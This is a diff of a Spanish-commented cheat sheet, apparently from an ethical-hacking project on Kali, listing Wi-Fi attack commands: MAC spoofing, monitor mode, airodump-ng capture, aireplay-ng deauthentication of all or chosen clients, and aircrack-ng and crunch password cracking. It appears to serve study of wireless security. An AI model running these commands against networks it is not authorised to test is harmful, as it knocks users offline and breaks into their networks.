@@ -544,12 +544,18 @@ sudo ifconfig wlan0 down # desactivar la interfaz
 sudo macchanger -r wlan0 # cambiar la dirección MAC (opcional)
 sudo iwconfig wlan0 mode monitor # colocar la interfaz en modo monitor
 sudo ifconfig wlan0 up # activar la interfaz
+
 sudo airmon-ng check kill # detener procesos que pueden interferir
+
 sudo airodump-ng wlan0 # comenzar la captura de paquetes y escanear redes
+sudo airodump-ng -w /home/kali/Desktop/Ethical-Hacking/projects/airodump-ng/data/airodump_sample  --output-format csv wlan0
 sudo airodump-ng --band a -w /home/kali/Desktop/archivo --output-format csv wlan0 # guardar capturas en formato CSV
+
 sudo airodump-ng -c [canal] --bssid [BSSID] -w /home/kali/Desktop/ [interfaz] # capturar paquetes de una red específica
+
 sudo aireplay-ng -0 0 -a [BSSID] [interfaz] # desautenticar a todos los clientes conectados
 sudo aireplay-ng -0 0 -a [BSSID] -c [Cliente MAC] [interfaz] # desautenticar a un cliente específico
+
 sudo aircrack-ng [archivo].cap -w /usr/share/wordlists/rockyou.txt # intentar crackear la contraseña
 crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o /home/kali/Desktop/wordlist.txt # generar una lista de palabras con Crunch
 sudo aircrack-ng [archivo].cap -w /home/kali/Desktop/wordlist.txt # usar la lista de palabras personalizada
